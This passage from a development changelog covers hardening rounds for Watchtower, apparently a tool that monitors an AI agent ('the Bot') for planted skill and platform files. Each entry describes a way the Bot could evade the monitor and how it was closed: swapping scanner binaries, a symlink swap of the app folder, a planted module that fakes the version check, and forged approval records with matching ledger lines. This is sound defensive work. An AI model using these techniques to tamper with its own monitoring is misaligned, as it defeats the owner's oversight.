They are now a separate kind, `unreadable` (`ScannerUnreadable`, `_interpreter_problem`): not run, stage failed, last results kept, revet and the built-in roll blocked, no WT-X005; doctor says "can't be checked now (…)". (5) codescan: a swapped semgrep's WT-X005 could be trimmed from the 4,096-byte handoff (criticals sort first); it is also in `scanner_alerts`, which `fit(keep=…)` never trims. semgrep output with a non-empty `errors` list is "did NOT finish", not "found and used". (6) `install.sh --scanners` removes `scanners/bin/python` and `python[0-9]*` before `python3 -m venv`, which leaves an existing link alone, so the reinstall WT-X005 asks for really replaces a re-pointed Python. (7) semgrep runs with `--metrics=off` (EGRESS says so), and README no longer says every program is checked and any mismatch is a high alert: for the Python scanners only the entry point is checked each run, and a copy the lock doesn't list is a plain note. (9) `--version` after a failed self-check prints only how many problems there are (the ledger keeps the names), and setup skips the reinstall only when `--version` exits 0 and its whole output is exactly the version. Replays in `tests/test_batch3_claude_review1.py` (14) and `test_scripts` (`Publish.test_claude1_*`, `InstallScanners.test_claude1_*`); with 51fa551's wt.py, scripts, docs and `test_batch3_selfcheck_docs.py`, all 16 fail on an assertion and none errors (the forged skillspector ran the planted `python`). PR tests changed, no 7cf8996 assertion among them: `test_batch3_selfcheck_docs.test_a_changed_copy_never_prints_its_version` now expects the count, not the file name (finding 9); `test_scripts.Publish.setUp` copies the committed setup skill, README and install.sh, and `test_batch3_the_tag_comes_from_wt_version` bumps them with VERSION (finding 3). (8) Replay accounting against 7cf8996, the PR's real base (its non-test files exactly, stash method): of the PR's 73 new tests, 13 fail, 55 error (the scanner code, the lock and its reader aren't there, so setUp or the first call raises) and 5 pass: the 3 marked contrasts (`test_batch3_selfcheck_docs` `test_a_clean_install_prints_its_version`, now marked, and `test_a_developer_checkout_prints_its_version`; `test_scripts.InstallScanners.test_batch3_a_failed_download_keeps_the_old_copy`) and the 2 accounting checks that read only test files (`test_batch3_fix_round1` test_13, `test_batch3_claude_review1` test_8), which fail with the earlier test files. By file: `test_batch3_scanners` 11 error; `test_batch3_selfcheck_docs` 6 fail, 2 pass; `test_batch3_fix_round1` 2 fail, 12 error, 1 pass; `test_batch3_fix_round2` 6 error; `test_batch3_final_review` 9 error, its 3 contrasts too (they pass on dd27c42, as its docstrings say); `test_batch3_claude_review1` 3 fail, 10 error, 1 pass; `test_scripts`' 10 PR tests: InstallScanners 2 fail and 1 contrast passes, Publish 7 error (setUp copies `scripts/scanner_lock.py`, which 7cf8996 lacks; under this setUp the 7 Publish tests from 7cf8996 error there too). Each test file's docstring now says the same. Known gaps: other commands' SELF-CHECK FAILED line still names up to five files (7cf8996's assertions in `test_v068_hardening` and `test_redteam` expect the names), so a planted name still reaches those outputs; only `--version`, which setup reads, is count-only. The `#!python` form is kept (no lock or test change) and is sound only together with the relative-first-line refusal. MANIFEST.sha256 isn't anchored to anything the Bot can't write, so rewriting it together with the lock before a run still passes the self-check (as on 7cf8996); round 1 closes the swap after it. `unreadable` can also come from pressure the Bot creates (memory, file descriptors): the scanner still doesn't run and revet stays blocked, but there is no alarm. The version check reads only the setup skill, README and install.sh. `install.sh` replaces the Python links only; other venv files are still as in the gaps above.
- Hardening batch 3, Claude review, round 2 (PR #7, rows 12 and 5; the final fix round): (1) every OSError while reading a scanner was `unreadable`, so a swapped copy with mode 0111 (EACCES at open) or a link swapped in after the lstat (ELOOP) lost its high WT-X005 after one `chmod`. Errors are now sorted by errno (`_program_error`): only ENOMEM, EMFILE, ENFILE, EAGAIN, EINTR and failures of the sealed copy itself (memfd, writing it, sealing, `/proc`: `SealUnavailable`) are `unreadable`. Any other failure to open or read the program file is `changed`, and a copy without its owner-read bit is `changed` before it is opened. When the sealed copy can't be made, nothing runs, but the file is still hashed once without a copy, so a swapped one is still a WT-X005. (2) `release_manifest()` read MANIFEST.sha256 again whenever the real folder behind `app` changed, so `mv app app.real; ln -s evil app` after the self-check had the Bot's manifest vouch for its own lock reader, which ran inside Watchtower, and its lock made the Bot's gitleaks verified. A remembered manifest is now never read again, and a different folder behind the same name lists nothing. (3) Only refusals at launch lasted the whole run, so a scanner swapped before the run and put back after its stage was skipped read as verified at the final check: no X005, and it counted as used. `changed` now lasts the rest of the run too, and `engines_used` counts only scanners with no problem at any point this run (`SCANNERS_HELD`, `scanner_used`). (4) `install.sh --scanners` now removes `$WT_HOME/scanners` and makes the environment from scratch. `python3 -m venv` on an existing one kept `bin/pip`, the entry points and site-packages, so a swapped entry point survived the reinstall WT-X005 asks for, and a planted pip ran and could print "Scanners installed from the checksum lock." and touch LOCKED. It uses `rm -rf`, not `venv --clear`, because `--clear` empties the folder that a link named `scanners` points to. (5) audit and daily list every open WT-X005 in `scanner_alerts`, which `fit(keep=…)` never trims (daily's `decoys` are now kept the same way). Ten new critical or high findings pushed the X005 out of `new` and `top_fixes`. The daily routine and the audit skill say to report it. (6) In an installed copy, a lock or reader that doesn't match the remembered manifest still lists nothing, and it is now remembered as changed (`scanner_list_changed`). Every scanner present then reads `changed` and gives a WT-X005, instead of the plain "not listed" of the empty lock this PR ships. The same applies to a lock that is gone, is a link or can't be read for lack of permission. (7) semgrep also runs with `--disable-version-check` (EGRESS says so). (8) semgrep `errors` entries at level warn, warning or info are partial parses: the run counts as finished ("N files only partly parsed"). Entries at error level, or with no level, still mean "did NOT finish". (9) install.sh's two activation checks and the setup skill's version check run `python3 -I`, and so do the daily and tidy routines and the audit skill. Without `-I`, a planted `watchtower/argparse.py` ran before the self-check and printed exactly the version. Review 1 item 9, cheap hardening: SELF-CHECK FAILED in other commands names a file only when its name is plain (letters, digits, `._/-`, at most 80 characters), else "a file with an unusual name (named in Watchtower's ledger)" (`shown_problem`); the ledger keeps every name. THREAT_MODEL now has a Known gaps section for the MANIFEST rewrite. Replays: `tests/test_batch3_claude_review2.py` (17) and `test_scripts.InstallScanners.test_claude2_*` (2). With 150144a's wt.py, install.sh, docs, routines and skills (stash method, new tests in place), 16 fail on their assertion and none errors; the 3 marked contrasts pass (EMFILE stays `unreadable`; an error-level semgrep entry is still not finished; a linked `scanners` folder isn't emptied). No existing assertion changed. One round-1 doc check pins the setup skill's "`--version` exits 0 and its whole output is exactly", and the new wording keeps it. Known gaps: as before, MANIFEST.sha256 rewritten together with the files before a run passes the self-check (now in THREAT_MODEL). Memory or file-descriptor pressure the Bot causes is still `unreadable`, with no alarm. A command that skips the self-check (doctor) still takes the manifest from disk at its first use. `engines_used` leaves out any scanner that had a problem this run; it doesn't track actual launches, because a daily doesn't need every scanner. A lock read that fails with a plain OSError on a plain file counts as pressure, not a change (read_lock reports only the error's type). `install.sh --scanners` now deletes the whole scanners folder, so a semgrep put there by hand must be put back, and a scanner whose download fails is now missing instead of kept as the old copy. The other skills still start `wt.py` without `-I`. SELF-CHECK FAILED still shows up to 12 characters of `.git/HEAD` in the commit line. `--disable-version-check` and semgrep's `level` values come from semgrep's documented CLI and JSON; no real semgrep was run here. `test_boxes.FactoryBox`'s two tests fail on 150144a as well (this computer's environment), not because of this change.
- Hardening batch 3, row 8 (R3, platform lone changes) is not in this change: its lone/bundle grouping (ctime, the 3-file rule, `state/platform_changes.json`), the owner-approved platform update (`platform_update`, `fix --apply --owner-said-yes`, `state/platform_plan.json`), one-to-one move matching, the vendor-prefix and exact platform-config checks (with Codex's colon-path fixes for them), and its tests and docs moved to the `harden/item8-wip` branch for a provenance-based redesign (ctime is not vendor provenance). Platform behaviour is as in 7cf8996. The redesign is the next entry (item 8, platform trust from vendor provenance).
- Item 8 redesign (roadmap row 8 / R3), platform trust from vendor provenance: a lone file planted under a platform root (`~/.grok/bundled/skills/helper/SKILL.md`) was a low WT-I002 folded into the "Platform refresh" Tip and rolled into the baseline at the next full audit. The first attempt (dd27c42, `harden/item8-wip`) trusted ctime grouping, file counts and Bot-writable state, and Codex left four highs open on it. Finding: none of the five platform roots ships any manifest, signature or hash list Watchtower can use, and one inside the home folder would prove nothing, so the only vendor hash list the Bot can't silently change is one in Watchtower's own release. New `rules/platform-release.lock` (`sha256sum` lines run from `~`, `<sha256>  <path under the home folder>`), read by `platform_lock()` like the scanner lock: opened without following a link, a plain file of at most 4 MB in UTF-8, held to its MANIFEST.sha256 line in an installed copy, cached on size, mtime and inode; one malformed line (a bad hash, a path from `/`, `..`, a colon, a path outside the platform roots) makes the whole list unusable, and the audit says so in a note. `platform_listed(p, h)` needs the path strictly inside a platform root as written and as its real path, and both listed with exactly that sha256. It ships with no entries, so every new or changed file under a platform root is now a counted high, daily included: WT-I002 "A new file appeared in {vendor}'s own skill folder, and {vendor}'s release list doesn't include it" or WT-I001 "One of {vendor}'s own files changed, and the new version isn't on {vendor}'s release list" (Codex, Claude or Grok Bot by folder), with `unverified_platform` and no `refresh`. It never goes into the Tip, is never in the platform or built-in scope, never rolls (`roll_builtin`), never joins the "reviewed skills changed" group, never reaches `fix --revet` (`changed_skills`, and `revet` won't re-approve a skill holding such a file) and `accept` refuses it. A listed update behaves as before (DQ-042 unchanged). (Codex high 1, ctime) A plant written next to other changes, touched listed files or a listed update stays its own counted high. (Codex high 2, moves) `match_moves` is one to one, same name, approved file gone from disk, same boundary, and platform-ish paths are never on either side, so a deleted bundled SKILL.md no longer hides its bytes planted in `.codex/skills/.system`, and a relocated platform file needs a line for its new path. (Codex highs 3 and 4, the yes) `wt.py fix` adds `platform_unverified`: the candidates from `last_findings.json` are only a list of paths, each re-proved from disk (platform-ish, a plain file of at most 2 MB, read once, not approved and not listed), and Watchtower's rules run on those in-memory bytes; the engines and `engine_cache.json` are never used for this approval. Files the rules flag at medium or above, too large or past 200 are listed as not offered and stay high. Each offered file shows its path, new or changed, its sha256 start and "Watchtower's rules found nothing in this exact file", and the code is the start of a sha256 over the sorted `path<TAB>sha256` lines. `wt.py fix --approve-platform <code> --owner-said-yes` works the set out again from disk and approves exactly those bytes only when the code matches (event `platform-approved`); otherwise "NOT APPROVED: Grok Bot's files changed since the owner saw the list", and without the yes NOT SAVED. Nothing is written to state, so `platform_plan.json`, the Tip and an edited findings file can't widen it. Ported from dd27c42 (left unflagged by Codex): the real-path checks (`vendor_root_path`, `is_platform_config`, `literal_path`, `finding(path=)` for WT-S001 and gitleaks' per-file WT-S002) in `builtin`, `is_vendor`, `secret_severity`, `platform_file`, `counts`, `platform_owned` and `is_platform_secret_store`, so `~/.grok/bundled-evil`, links in and out, user folders named `plugins` or `managed-skills`, project folders named `sand-data` and colon names are never platform. Not ported: the ctime grouping, `platform_plan.json` and the engine-cache proof. Replays in `tests/test_item8_provenance.py` (30 tests), measured on a real checkout of the base (857ab38, sources stashed): 25 fail (15 reach their assertion, 10 error on a missing feature), 5 contrasts pass. Existing tests got setup-only changes, no assertion changes: `Box` points `wt.PLATFORM_LOCK` at an empty file in the box; `profiles.vendor_release` lists files and `platform_refresh` lists the pptx files it writes; DQ-042's `_Learn` lists the learn releases it writes (the rug pull included: a vendor that ships bad bytes still alerts as before); `test_precision_item4`'s `bundled()` lists the files it writes. Known gaps: until the lock has a vendor's lines, every platform update is one counted high per file, daily included, until one yes per update (the DQ-042 noise, louder), and `.codex/skills/.system` and `.claude/plugins/synced` sync on their own. The lock is only as trustworthy as Watchtower's own release files (same tier as `wt.py`), and Ken has to copy the hashes from a fresh computer, because no vendor publishes them. Out of scope, same shape, needs Ken's call: catalog plugins (`in_catalog_plugin`) are still trusted from `state/plugins.json` plus the 10-minute `CATALOG_WINDOW` (DQ-017), and a clean change to an installed (non-platform) plugin still rolls silently; making them fail-loud turns every catalog sync into per-file highs and touches DQ-017 and item 4 tests. `baseline.json` and `last_findings.json` stay Bot-writable (deleting a baseline line makes a file "new", which is fail-loud), and `wt.py baseline --owner-said-yes` still approves everything on disk (R4). The yes rests on Watchtower's rules and the owner's look, not the engines: a plant only an engine would catch can be approved on a yes; the full audit's engines still check it afterwards and can only raise. The Bot that runs `fix` can also compute a code itself; the flag records the owner's yes, as `--owner-said-yes` does everywhere.
- Item 8, Codex review, round 1 (on 6e5ecb2; four highs, two mediums): (high 1) the inventory kept one name per real file, the alphabetically first, so a baselined `~/.agents/skills/helper/SKILL.md` turned into a link to a new `~/.grok/bundled/skills/helper/SKILL.md` hid the platform file and daily said NO_CHANGES. Only the scanning is done once per real file now; every name of it that is platform-ish is kept (`inv["platform_aliases"]`) and fingerprinted with its skill folder, so it gets the integrity and provenance checks. (high 2) `platform_ish()` used `under_platform_root` (cut at the first colon, no for anything in or through an owner's folder) and `platform_skill_path` (both readings platform, no user root), so a platform file linked into a workflow was an ordinary WT-I001 that `--revet` approved, and `~/.agents/skills/helper:alias/SKILL.md` leading into `.grok/bundled` rolled in as a built-in update. It now holds the whole path as written, and separately where it really leads, to every platform root (as written and real), with no user-root exclusion and no colon reading. (high 3) `revet` hashed a file for the release-list check and again for the baseline, so bytes swapped in between were saved; each file is hashed once and that digest is both checked and saved. (high 4) a `suppressions.json` entry with the finding's key accepted an `unverified_platform` finding before `accept_refused` ran; `is_accepted` now refuses those before every branch, and the dismiss step, `dismiss` and `accept --all-current` refuse them too. (medium 1) Watchtower's own released `watchtower-fix/SKILL.md` copied into `.grok/bundled/skills` passed as its own release; the provenance check now comes before the own-release and move exemptions. (medium 2) the 200-file limit came after each candidate was read, hashed and scanned; at most 200 candidates are looked at and 32 MB read per preview or apply, and the rest are reported as `deferred` (count and note) and stay high. Known gaps: a link between a platform folder and any other folder (an owner's skill whose real file is in a platform folder, or the reverse) is now held to the release list under each of its names, approved only by `--approve-platform` (never `--revet`), and the first run after the upgrade raises one counted high per platform name not yet in the baseline; a forged findings file can fill the 200 slots with paths that need nothing (non-platform, approved or listed), deferring real candidates until the next audit rewrites `last_findings.json`; for files outside platform folders, `revet` still scans one read and saves the digest of another (the release-list check is on the saved digest); the approved copy (`save_approved`) is read again; `own_release_file` itself still matches by folder name, only its place in the audit changed; `wt.py baseline --owner-said-yes` still approves everything on disk (R4). Replays in `tests/test_item8_fix_round1.py` (11 tests), measured on 6e5ecb2 with `watchtower/wt.py` stashed: 7 fail at their assertion, 4 contrasts pass. No existing test changed.
- Item 8, Codex review, round 2 (on b8617aa; three highs, three mediums): (high 1) the platform files were only what the scanner's inventory kept, so a baselined `SKILL.md` turned into a link into Watchtower's quarantine (a "not live" skill, and the removal check skipped it because it was still there), a folder link, a loose script outside any skill folder and a file under a skipped `node_modules` never reached the provenance check, and daily said NO_CHANGES. Provenance now has its own walk of each platform folder inside the roots (`platform_inventory`): no skip list, no live or quarantine test, every literal name kept, folder links followed with a cycle check (a link back up into its own folder is skipped, its files are listed under the shorter name), at most 20,000 files, 32 levels and 1,000 folder links. A folder it can't finish (too big, too deep, too many links, unreadable) is a counted high, WT-I011 "Watchtower couldn't check all of {vendor}'s own skill folder" (an evidence rule, `unverified_platform`), and a platform finding counts even when its name leads into quarantine. (high 2) "new" in daily means not in `last_findings.json`, which the Bot can write: a plant whose deterministic finding was copied there in advance was never new, and daily said NO_CHANGES. Daily now checks for open `unverified_platform` findings before every quiet answer (SCANNERS_MISSING, NO_CHANGES, NO_CHANGES_BUT_NOT_CHECKED) and lists them every day, new or not, in `platform_unverified` (a dict `fit()` never trims: the exact `open` count, the first 50 files, `more`, and what to do); being in last run's findings is never acknowledgment. (high 3) a matching `baseline.json` line skipped provenance, and a blanket `baseline --owner-said-yes` wrote such lines for any platform file. A platform file is now proven only by the release list or by `state/platform_approved.json` (`platform_proven`), whose entries bind the literal path, the real path it led to and the sha256, and which `--approve-platform` writes; a baseline line alone gives a high ("…is on Watchtower's list without the owner's yes or {vendor}'s release list"), `fix` offers it and `revet` won't re-approve it. `baseline --owner-said-yes` (after a reset, or any later yes) leaves unproven platform files out: such a file keeps its old line (so it still shows as changed) or stays out, and the output points to `--approve-platform`. (medium 1) approved files kept their slots in `fix`'s 200-file list until the next audit, and 200 refused files starved the rest for ever. Approved files now leave the candidate list at once (`approve_platform` drops their findings from `last_findings.json`), and a deferred list gives `next_page`, a cursor (the last path looked at, in hex): `wt.py fix --platform-from <cursor>` shows the files after it, and the code shown there is for that page only (`--approve-platform <code> --platform-from <cursor> --owner-said-yes`). (medium 2) `revet` saved the digest it checked but made the approved copy from a second read, so version 3 swapped in after version 2 passed the list became the "approved copy" and `diff` said "same as the approved copy". Each file is read once (`read_snapshot`); the baseline digest and the copy (`save_approved(d, snapshot)`) both come from those bytes, and files not in that set are left out of the copy. (medium 3) a platform name that is a link to the owner's own file raised a high nothing could approve: the read refused every link, and its destination can't be on the release list. `fix` now follows the name to its real file, reads that once (never through a further link) and keeps it only if the name still leads to the same device and inode afterwards (`_read_platform`; else "it changed where it leads while Watchtower read it"); the row shows `leads_to`, and the code covers path, real path and sha256 (`wt-platform-yes-v2`). Docs: `watchtower-fix` lists `leads_to` and the next page, `daily-watch` says the open count every day, README. Replays in `tests/test_item8_fix_round2.py` (17 tests), measured on b8617aa with `watchtower/wt.py` and the three docs stashed: 15 fail at their assertion, 2 contrasts pass. No existing test changed, and no 857ab38 assertion. Known gaps: the first baseline on a box still vouches for the platform files it finds and records them in `platform_approved.json` (`FIRST_BASELINE_VOUCHES`), so a Bot that wipes all of Watchtower's state gets a new first run. Leaving them out, as Codex asked, was measured: 33 of the 335 platform-area tests failed, including 857ab38 assertions (`test_precision_gate.BusyCleanBox`, `test_precision_item6.ChangeSources`, the DQ-042 replays in `test_dq042_vendor_skills`, `test_dq028_030` DQ-029, `test_v070_no_blind_spots`, `test_boxes.FactoryBox`): every bundled file would be a high from the first run, because the release list ships empty. `platform_approved.json` is in Watchtower's state like `baseline.json`, so a Bot that rewrites both can still forge an approval; there is no store the Bot can't write at this layer. After the upgrade, an install whose baseline predates the record raises one counted high per platform file not on the release list, once, until the owner's `--approve-platform` (200 per page). The record follows a link's destination, so an owner's edit to a skill that a platform name links to is a platform high again. The walk covers only the platform folders within the roots an audit is given. A forged findings file can still pad the candidate list with paths that need nothing; the cursor pages past them.
- Item 8, Codex review, round 3 (on 9356f16; three highs, one medium; the final round): (high 1) only a platform folder inside an audit root was walked, so `--roots ~/.grok/bundled/bin` fingerprinted none of its loose scripts and `--roots ~/.grok/bundled/skills` none of the files the scanner's inventory skips (`node_modules`): no file, no WT-I011, no alert. A requested root inside a platform folder, as written or where it leads, is now walked too (`platform_walk_starts`), with the same limits and the same WT-I011 high when the walk can't finish; a root inside one already walked is walked once. (high 2) an empty `baseline.json` plus a `baseline_meta.json` saying `"files": 0` is a first run, and the first baseline vouched for every unlisted platform file and recorded it in `platform_approved.json` even on a box with history. The first baseline now vouches only when nothing shows an earlier run (`earlier_run_evidence`: an audit, daily, baseline or platform approval in the ledger, or `last_findings.json`, `score_history.csv`, `events.json`, `platform_approved.json` or an approved copy), read by the audit before the run writes anything (`meta["first_vouches"]`); otherwise its unproven platform files stay out of the baseline and are counted highs until `--approve-platform`, and `baseline` says "Not approved by this". The owner's own files are still baselined without a yes (R10). (high 3) a Bot-written `platform_approved.json` entry with a plant's path, target and digest was provenance on its own (daily said NO_CHANGES). Each entry now counts only when the ledger holds the event that wrote it (`platform-approved` from `--approve-platform`, `platform-first-baseline` from the first baseline), which lists a digest of every (path, sha256, target) it approved (`bind`); the event is written before the record. (medium) `baseline --owner-said-yes` kept a refused platform file at its old line but copied its new bytes, so `wt.py diff` said "same as the approved copy". A skill holding a refused file now keeps that file's entry from the approved copy before (none, if it had none), and its other files are copied from one read, only when those bytes are the ones just baselined (`save_approved_all(dirs, held, base)`); the first baseline on a box with history does the same. Replays in `tests/test_item8_fix_round3.py` (14 tests), measured on c2982f8 with `watchtower/wt.py` and `CHANGELOG.md` stashed. No existing test or assertion changed; the 23 platform and baseline test files (467 tests) pass. Known gaps: this is bounded hardening, not authentication: the ledger is in Watchtower's state too, so a Bot that writes both `platform_approved.json` and a matching ledger line (the format is in the source) still forges an approval, and a Bot that deletes every file `earlier_run_evidence` reads still gets a new first run that vouches for the platform files it finds. A real fix needs a store or key the Bot can't write (Ken's decision). A record whose ledger line is lost (a truncated or rotated ledger) stops counting, and those files are highs again until the owner's yes. An owner whose first run found nothing and who later gets platform folders sees their files as highs once, until `--approve-platform`.
- Item 8, Ken's decision: release list only (Oct 18). A file in a platform folder (`.grok/bundled`, `sand-data/managed-skills`, `agent-data/managed-skills`, `.codex/skills/.system`, `.claude/plugins/synced`) is trusted only when `rules/platform-release.lock` lists its path and exact sha256; the lock ships with the release, is in MANIFEST.sha256 and is held to it by the self-check. Nothing on the computer approves one. Removed: the owner's yes (`fix --approve-platform`, the code, the paged and read-once preview, `--platform-from` pages), the approval record `state/platform_approved.json`, its ledger binding (`platform-approved`, `platform-first-baseline`), first-run vouching (`FIRST_BASELINE_VOUCHES`) and `earlier_run_evidence`. Two highs were open on 7ab522f, both closed: (H1) a Bot-written `platform_approved.json` plus a matching ledger line was provenance, and daily said NO_CHANGES; (H2) a brand-new box, or one whose Watchtower state was wiped, took a first baseline that vouched for every unlisted platform file. Every audit, first or not, now checks platform files against the lock alone (`platform_unproven`, `platform_listed`); the first baseline, on a new or wiped box, holds every unlisted platform file out and says "Not approved by this: N". `fix --approve-platform` and `--platform-from` stay in the parser (a Bot following an older SKILL.md gets a plain answer, and the README CLI test stays true) and are always refused with one message naming the lock (`PLATFORM_YES_REFUSED`, "NOT APPROVED: …"), writing nothing. The `fix` preview's `platform_unverified` is now the read-only list daily prints (`platform_open`): the exact `open` count, the first 50 files with rule, severity, title, where and evidence, `more`, and `next` (`wt.py show WT-I002 --limit 100000` / `WT-I001` list every one); it reads no platform file. `revet`, `accept`, `dismiss`, suppressions and `baseline --owner-said-yes` still never approve one; their texts now say only a release that lists it clears it. The alert's fix text says Watchtower can't approve it on this computer and to remove it if unexpected; the baseline-line title is now "…is on Watchtower's list, but {vendor}'s release list doesn't include it". Migration: no code for vouched baselines; a baselined platform file that isn't on the lock is one counted high at the next audit, daily included (its baseline line stays, inert). An old `platform_approved.json` is never read or deleted; the audit adds one note while it exists. Old ledger events are ignored. (#9 medium a) the approve path that rewrote `last_findings.json` unmasked is gone; the refused yes leaves `last_findings.json` and `baseline.json` byte for byte unchanged. (#9 medium b) `baseline --owner-said-yes` dropped a held platform file's approved-copy entry when the file had been replaced by a link (`skill_files` skips links), so `diff` showed a removal; `save_approved_all` now keeps a held file's entry from the copy before even when it isn't listed now, and `diff` says "replaced by a link (Watchtower doesn't follow links inside a skill)". Replays in `tests/test_item8_release_only.py` (11 tests), measured with `watchtower/wt.py` at 7ab522f: 9 fail at their assertion, 2 contrasts pass. Older suites got fixture changes only (the platform files each test box writes are listed in its lock: `profiles.vendor_release_tree`, `busy_clean_box`, `FactoryBox`, DQ-042's `_Learn`, `test_dq028_030`'s `Box` and DQ-029, `test_v070_no_blind_spots`). The item 8 tests that asserted a local yes were converted to "refused, stays high", or to the new list's fields (`test_item8_provenance`, `test_item8_fix_round1/2/3`); none was deleted, and the PR lists every changed assertion. Known gaps: the lock was filled on Oct 18 from Ken's Grok Bot box after Bots had run on it (Ken accepted that, see the next item), so it vouches for what that box had then, not a clean vendor install; any bundled file not on it is a Confirmed high on every box ("Check this week", grade C at best) and daily never says NO_CHANGES while one is open; a vendor update after Oct 18 is a high until a release lists it; approved copies made from an old vouched first baseline can still say "same as the approved copy" (`diff` is a viewer, not trust); the old record file is left in place; the lock is only as trustworthy as the release (and a development checkout without MANIFEST.sha256 uses it unchecked).
- Item 8, lock filled from Ken's box (Oct 18): 623 entries. `rules/platform-release.lock` now holds the `sha256sum` lines of every file in the five platform folders on Ken's Grok Bot box, made with the command in its header (paths and digests only; `.grok/auth.json` is outside those folders and stays a Platform note). Caveat: that box was not freshly created; Bots had already run on it, so the lock vouches for what was on it on Oct 18, not for a clean vendor install, and Ken accepted that. A vendor update after Oct 18 stays a counted high until a release lists it. `Docs.test_the_release_list_ships_empty_and_is_in_the_manifest` became `test_the_release_list_is_well_formed_and_is_in_the_manifest` (at least one entry, every line `<sha256>  <path>` inside a platform folder, no `..`, colon, leading `/` or duplicate, nothing at `.grok/auth.json`, and `platform_lock()` reads the whole file with no problem); the MANIFEST check is unchanged.
- Item 8, PR #9, sync bookkeeping out of the lock (Ken: few false alarms): `PLATFORM_CHURN` in wt.py (`cache.json` directly in `sand-data/managed-skills` or `agent-data/managed-skills`; `.bucket-<id>_<id>` directly in `.claude/plugins/synced`; `*.meta.json`, `.marketplaces.json`, `manifest.json` directly in a `.claude/plugins/synced/<id>_<id>/` folder; a plain file, no link, no exec bit, no SKILL.md beside it, as written and as its real path) is no provenance subject: not walked, so no WT-I002/WT-I001 high, no WT-I011 count and no baseline line (an older baseline's line for one is ignored); key checks on them are unchanged. The lock drops its 7 such lines (623 → 616), its fill command skips the same pattern, and its header names Ken's Oct 18 fill as the accepted exception to a clean computer. Replays in `tests/test_item8_churn.py` (18 tests), measured with `watchtower/wt.py` and the lock stashed at 7e853c4: 16 fail at their assertion, 2 contrasts pass.
- Item 8, PR #9, lock-trim, Codex round 1 (one high, one medium): (high) a plugin bucket's `*.meta.json`, `manifest.json` and `.marketplaces.json` were skipped as bookkeeping, but Claude's plugin loader reads them (`installation_preference: "required"` enables a synced plugin the user disabled; `manifest.json`'s name and generation pick the plugin folders; `.marketplaces.json` builds the marketplace source choices), so a changed one changed what loads with no alert. They are provenance subjects again: `PLATFORM_CHURN` is only `cache.json` directly in `sand-data/managed-skills` or `agent-data/managed-skills` and the `.bucket-<id>_<id>` marker directly in `.claude/plugins/synced`, and the lock has Ken's 4 lines for them back (paths and hashes from his box, Oct 18): 620 entries. (medium) the lock's fill command and `platform_churn_file` tested different things (the fill skipped a `cache.json` beside a SKILL.md that wt.py kept, so no lock line could clear it; wt.py skipped hardlinked and linked-folder aliases). Both now test exactly: the name and place, a regular file by lstat (no link), no exec bit, one name (`st_nlink == 1`, the fill's `-links 1`), and a real path equal to the written path under the real home folder (no link in a folder above it; the fill's `realpath` test). The "no SKILL.md beside it" condition is gone: the fill can't express it, and both bookkeeping names sit at a platform folder's top, never in a skill folder. Replays in `tests/test_item8_churn.py` (6 new tests, 1 converted), measured with `watchtower/wt.py` and the lock stashed at 7d906ca: 9 fail at their assertion (the 7, plus the 2 whose data changed). Changed assertions (tests added in 7d906ca that asserted the removed rules): `CHURN` is the 3 bookkeeping files (the bucket's 3 loader files left it); `REMOVED` is the 3 lines (the 4 restored ones are `RESTORED`), so `test_e_the_shipped_lock_lists_no_bookkeeping` and `test_e_the_count_line_is_the_real_count` (623 − 3 = 620) check those; `test_a_the_fill_command_leaves_out_the_bookkeeping_and_keeps_the_rest` expects the bucket's `manifest.json`, `build.meta.json` and `.marketplaces.json` listed; `test_d_a_bookkeeping_name_with_an_exec_bit_is_not_bookkeeping` sets the exec bit on the `.bucket-` marker instead of `manifest.json`; `test_d_a_cache_json_beside_a_skill_md_is_not_bookkeeping` became `test_d_a_cache_json_beside_a_skill_md_is_bookkeeping_as_the_fill_skips_it` (the cache is quiet, a changed SKILL.md beside it is still a counted high). README's test count is now "more than 900" (947 tests). Known gaps: the loader's files are rewritten by Claude's plugin sync, so a sync that changes them (an `installationPreference` copied in, a new generation) is a counted high until a release lists the new bytes; a later noise reducer could normalize narrowly validated, behaviour-preserving fields instead of exempting whole files. The managed-skills `cache.json` was not shown to be unread by its platform. A platform folder reached through a link (or a link where the folder should be) gets no lock lines from the fill, as before.
- Item 8, PR #9, lock-trim, Codex round 2 (one high, two mediums; the final round): (high) `sand-data/managed-skills/cache.json` and `agent-data/managed-skills/cache.json` were skipped as bookkeeping, but the host reads them (its skill store takes each skill's name, description and body from the cache, and Run-now sends `@<name>` from it as the prompt), so a sync or a Bot that changed only the cache changed what runs with no alert. They are provenance subjects again: `PLATFORM_CHURN` is only the `.bucket-<id>_<id>` marker directly in `.claude/plugins/synced` (Claude's plugin discovery tests that it exists and never reads it), with the same conditions (a regular file, no link, no exec bit, one name, real path = written path), and the lock has Ken's 2 cache lines back (paths and hashes from his box, Oct 18): 622 entries. (medium) with `agent-data` a link to `sand-data`, the fill skipped the canonical cache but listed its alias, and `platform_listed` needs both, so no filled lock could clear the alias; with the cache back under provenance the fill lists both, and every line it writes now clears its file as written and as its real path. (medium) `platform_churn_file` held a file to every home base it sits under, so with the home folder inside `/home/box` (or linked into itself) a file the fill skipped was also seen by its longer path under the outer base and kept as a provenance subject no lock line could clear. It is now bookkeeping when, for one home base, it passes the test the fill run from that base makes; the lock's header says to run the fill from each home folder Watchtower checks. The second home base is now `BOX_HOME` (`home_bases()`, used by `platform_roots`, `_home_rels`, `platform_vendor` and `platform_churn_file`; unchanged at `/home/box`) so a test can put it in its box. Replays in `tests/test_item8_churn.py` (6 new tests), measured with `watchtower/wt.py` and the lock stashed at bda2790: all 6 fail at their assertion (`test_g_a_home_folder_linked_inside_itself_gets_one_answer` at the marker; `test_g_a_home_folder_inside_the_box_home_gets_one_answer`, Codex's case, only at the caches, as bda2790 has no `BOX_HOME`). Changed assertions (tests added in 7d906ca and bda2790 that asserted the removed cache exemption): `CHURN` is the marker alone, `REMOVED` is its one line and `RESTORED` adds the 2 cache lines, so `test_b_the_header_rule_is_platform_churn`, `test_b_the_plugin_loaders_files_are_not_bookkeeping` (now also the caches), `test_e_the_shipped_lock_lists_no_bookkeeping`, `test_e_the_lock_keeps_the_plugin_loaders_files` (616 + 6) and `test_e_the_count_line_is_the_real_count` (623 − 1) check those; the box writes both caches (different bytes) and lists them, and its sync rewrites only the marker; both `test_a` fill tests expect the caches listed; `test_c_bookkeeping_is_not_counted_in_the_walk_limit` allows 4 files (pdf, prime, the two caches); `test_c_contrast_a_key_in_the_bookkeeping_is_still_found` puts the key in the marker; the two `test_d_a_link_named_cache_json_…` tests make the link at the cache's path; `test_d_a_cache_json_beside_a_skill_md_is_bookkeeping_as_the_fill_skips_it` became `test_d_a_cache_json_beside_a_skill_md_is_held_to_the_lock` (`platform_churn_file` false; the listed cache stays quiet); 